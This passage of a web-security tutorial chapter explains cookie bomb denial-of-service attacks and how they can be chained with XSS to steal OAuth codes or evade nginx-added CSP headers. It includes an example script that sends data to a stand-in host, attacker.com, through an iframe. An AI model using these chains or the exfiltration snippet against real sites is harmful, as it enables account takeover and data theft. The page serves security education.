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" width="1073" height="498" class="img_ev3q"></p><p>I reported this vulnerability to Tumblr, and the next day I received a response stating:</p><blockquote><p>This behavior does not pose a concrete and exploitable risk to the platform in and on itself, as this can be fixed by clearing the cache, and is more of a nuisance than a security vulnerability.</p></blockquote><p>For some companies, the harm caused by cookie bomb attacks is considered minimal. Additionally, the first victim must visit the specific URL, and clearing the cookies resolves the issue. Therefore, they do not consider it a security vulnerability.</p><p>Microsoft&#x27;s response is similar. If there is only a cookie bomb attack without any additional vulnerabilities, it does not meet their minimum standard for security vulnerabilities.</p><p>So, what other vulnerabilities can be combined with cookie bomb attacks?</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="connecting-the-dots-with-cookie-bomb-vulnerabilities">Connecting the Dots with Cookie Bomb Vulnerabilities<a href="#connecting-the-dots-with-cookie-bomb-vulnerabilities" class="hash-link" aria-label="Direct link to Connecting the Dots with Cookie Bomb Vulnerabilities" title="Direct link to Connecting the Dots with Cookie Bomb Vulnerabilities">​</a></h2><p>In the field of cybersecurity, it has always been an art to connect seemingly small issues into a larger problem. While cookie bomb attacks alone may not be very impactful, when combined with other elements, they can potentially lead to severe vulnerabilities. For example, we have previously seen how same-site websites can bypass same-site cookie restrictions and exploit CORS limitations through parsing issues in the <code>content-type</code> header, resulting in a CSRF vulnerability.</p><p>The first case I want to introduce appeared in a talk by filedescriptor at HITCON CMT in 2019: <a href="https://www.youtube.com/watch?v=njQcVWPB1is&amp;ab_channel=HITCON" target="_blank" rel="noopener noreferrer">The cookie monster in your browsers</a>.</p><p>He discovered an XSS vulnerability on <code>example.com</code>, which used Google OAuth for login. He thought that he could use XSS to steal the OAuth code and gain direct access to the user&#x27;s account, turning it into a more severe account takeover vulnerability.</p><p>The typical OAuth flow is as follows:</p><ol><li>User clicks the &quot;Sign in with Google&quot; button.</li><li>The webpage redirects to <code>https://google.com/oauth?client_id=example</code>.</li><li>The user logs in and grants authorization on Google.</li><li>The webpage redirects to <code>https://example.com/oauth/callback?code=123</code>.</li><li>The webpage further redirects to <code>https://example.com/home</code>, indicating a successful login.</li></ol><p>If the user has already granted authorization, the third step is skipped, and the redirection occurs directly.</p><p>The problem now is that the code can only be used once. Once you visit <code>https://example.com/oauth/callback?code=123</code>, the frontend or backend will use the code, rendering any stolen code useless. This is where cookie bomb comes into play.</p><p>With the XSS vulnerability on <code>example.com</code>, we have complete control over the page. We can write cookies and execute a cookie bomb on the <code>/oauth</code> path. Then, we can add an iframe with the URL <code>https://google.com/oauth?client_id=example</code>. When the authorization is completed, the iframe will be redirected to <code>https://example.com/oauth/callback?code=123</code>. Due to the cookie bomb, the server will return an error at this point. We can retrieve the URL of the iframe and obtain the code, ensuring that it has not been used by anyone else.</p><p>The second case is related to CSP bypass. Some websites may not directly add CSP from the backend application, but instead use reverse proxies like nginx to add it uniformly:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    server {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        listen 80;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        server_name _;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        index index.php;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        root /www;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        location / {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            try_files $uri $uri/ /index.php?$query_string;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            add_header Content-Security-Policy &quot;script-src &#x27;none&#x27;; object-src &#x27;none&#x27;; frame-ancestors &#x27;none&#x27;;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            location ~ \.php$ {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                try_files $uri =404;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                fastcgi_pass unix:/run/php-fpm.sock;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                fastcgi_index index.php;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                include fastcgi_params;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>At first glance, there doesn&#x27;t seem to be a problem. However, if nginx returns a 4xx or 5xx error, this header will not be added to the response. This is the default behavior of nginx, as mentioned in the <a href="https://nginx.org/en/docs/http/ngx_http_headers_module.html#add_header" target="_blank" rel="noopener noreferrer">documentation</a>:</p><blockquote><p>Adds the specified field to a response header provided that the response code equals 200, 201 (1.3.10), 204, 206, 301, 302, 303, 304, 307 (1.1.16, 1.0.13), or 308 (1.13.0).</p></blockquote><p>Therefore, we can use a cookie bomb to create an error page that does not have the CSP header. Some people may wonder, but this is an error page, so what&#x27;s the use of not having CSP?</p><p>Let&#x27;s assume that the original page has a very strict CSP, with all directives set to <code>&#x27;self&#x27;</code>, except for <code>script-src</code> which has an additional <code>unsafe-inline</code>. And let&#x27;s say we found an XSS vulnerability, so we can execute code.</p><p>But the problem is, our data cannot be sent out! Because of CSP, all external links are blocked. At this point, we can use a cookie bomb to bombard the <code>/test</code> page first, and then put the <code>/test</code> page into an iframe.</p><p>Once it&#x27;s inside the iframe, due to the same-origin policy, I can directly access the <code>/test</code> page, which does not have CSP. Therefore, requests can be sent from this page, as shown in the following example:</p><div class="language-html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-html codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">iframe</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">id</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value" style="color:#e3116c">f</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">src</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">/test</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag special-attr attr-name" style="color:#00a4db">onload</span><span class="token tag special-attr attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag special-attr attr-value value javascript language-javascript function" style="color:#d73a49">run</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation" style="color:#393A34">(</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation" style="color:#393A34">)</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">iframe</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">script</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token script language-javascript"></span><br></span><span class="token-line" style="color:#393A34"><span class="token script language-javascript">  </span><span class="token script language-javascript keyword" style="color:#00009f">function</span><span class="token script language-javascript"> </span><span class="token script language-javascript function" style="color:#d73a49">run</span><span class="token script language-javascript punctuation" style="color:#393A34">(</span><span class="token script language-javascript punctuation" style="color:#393A34">)</span><span class="token script language-javascript"> </span><span class="token script language-javascript punctuation" style="color:#393A34">{</span><span class="token script language-javascript"></span><br></span><span class="token-line" style="color:#393A34"><span class="token script language-javascript">    f</span><span class="token script language-javascript punctuation" style="color:#393A34">.</span><span class="token script language-javascript property-access">contentWindow</span><span class="token script language-javascript punctuation" style="color:#393A34">.</span><span class="token script language-javascript method function property-access" style="color:#d73a49">fetch</span><span class="token script language-javascript punctuation" style="color:#393A34">(</span><span class="token script language-javascript string" style="color:#e3116c">&#x27;https://attacker.com?data=...&#x27;</span><span class="token script language-javascript punctuation" style="color:#393A34">)</span><span class="token script language-javascript"></span><br></span><span class="token-line" style="color:#393A34"><span class="token script language-javascript">  </span><span class="token script language-javascript punctuation" style="color:#393A34">}</span><span class="token script language-javascript"></span><br></span><span class="token-line" style="color:#393A34"><span class="token script language-javascript"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">script</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Methods like this bypass CSP restrictions by combining DoS with iframes.</p><p>(By the way, CSP currently cannot achieve &quot;blocking all external connections&quot;. If you only need to send requests externally, there are other faster methods, such as using <code>location=...</code> for page redirection, and so on.)</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a href="#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion">​</a></h2><p>In this article, we have seen another way to use cookies as a means of executing DoS attacks and preventing web pages from loading. Although this vulnerability itself does not have a significant impact, and many companies do not consider it a security vulnerability, when combined with other techniques, it can become a more impactful vulnerability.</p><p>This concludes Chapter 4, &quot;Cross-site Attacks&quot;. In the recent articles, we first understood the difference between origin and site, then learned about CORS settings and the consequences of misconfigurations. We also explored CSRF and same-site cookies, and finally discussed the attacks that can be executed after gaining control over same-site.</p><p>Starting from the next article, we will enter Chapter 5: &quot;Other Interesting Topics&quot;.</p><p>This article is adapted from: <a href="https://blog.huli.tw/2021/07/10/en/cookie-bomb/" target="_blank" rel="noopener noreferrer">DoS Attack Using Cookie Features: Cookie Bomb</a></p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/beyond-xss/en/ch4/subdomain/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">From same-site to main site</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/beyond-xss/en/ch5/clickjacking/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">What You See Is Not What You Get: Clickjacking</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#introduction-to-cookie-bomb" class="table-of-contents__link toc-highlight">Introduction to Cookie Bomb</a></li><li><a href="#attack-process" class="table-of-contents__link toc-highlight">Attack Process</a></li><li><a href="#defense-measures" class="table-of-contents__link toc-highlight">Defense Measures</a></li><li><a href="#expanding-the-attack-surface" class="table-of-contents__link toc-highlight">Expanding the Attack Surface</a></li><li><a href="#finding-a-place-to-easily-set-cookies" class="table-of-contents__link toc-highlight">Finding a Place to Easily Set Cookies</a></li><li><a href="#make-a-poc" class="table-of-contents__link toc-highlight">Make a PoC</a></li><li><a href="#mitigation" class="table-of-contents__link toc-highlight">Mitigation</a></li><li><a href="#another-real-world-example" class="table-of-contents__link toc-highlight">Another Real-world Example</a></li><li><a href="#connecting-the-dots-with-cookie-bomb-vulnerabilities" class="table-of-contents__link toc-highlight">Connecting the Dots with Cookie Bomb Vulnerabilities</a></li><li><a href="#conclusion" class="table-of-contents__link toc-highlight">Conclusion</a></li></ul></div></div></div></div></main></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2023 Huli. All rights reserved. Built with Docusaurus.</div></div></div></footer></div>
<script src="/beyond-xss/en/assets/js/runtime~main.222f121e.js"></script>
<script src="/beyond-xss/en/assets/js/main.56058cb3.js"></script>
</body>
</html>